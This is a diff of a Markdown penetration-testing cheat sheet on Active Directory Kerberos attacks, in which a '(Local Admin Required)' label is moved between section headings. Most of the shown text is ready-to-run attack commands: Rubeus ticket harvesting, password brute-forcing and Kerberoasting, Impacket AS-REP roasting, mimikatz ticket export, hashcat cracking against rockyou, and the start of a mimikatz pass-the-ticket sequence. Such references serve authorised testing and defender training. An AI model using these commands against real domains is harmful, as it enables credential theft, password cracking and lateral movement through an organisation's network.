@@ -15,7 +15,7 @@ Rubeus.exe harvest /interval:30
 ```shell
 Rubeus.exe brute /password:Password1 /noticket
 ```
-## Kerberoasting w/ Rubeus & Impacket (Local Admin Required)
+## Kerberoasting w/ Rubeus & Impacket 
 It helps to crack the hash and use it with Mimikatz to create tickets.
 ```shell
 Rubeus.exe kerberoast
@@ -37,14 +37,14 @@ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
 
-### Extracting & Crack Tickets
+### Extracting & Crack Tickets (Local Admin Required)
 
 ```
 mimikatz#  kerberos::list /export
 hashcat -m18200  <ticket.kirbi> rockyou.txt
 ```
 
-## Pass the Ticket w/ mimikatz
+## Pass the Ticket w/ mimikatz (Local Admin Required)
 ```shell
 mimikatz.exe
 privilege::debug           #Ensure this outputs [output '20' OK] (You need admin privileges)
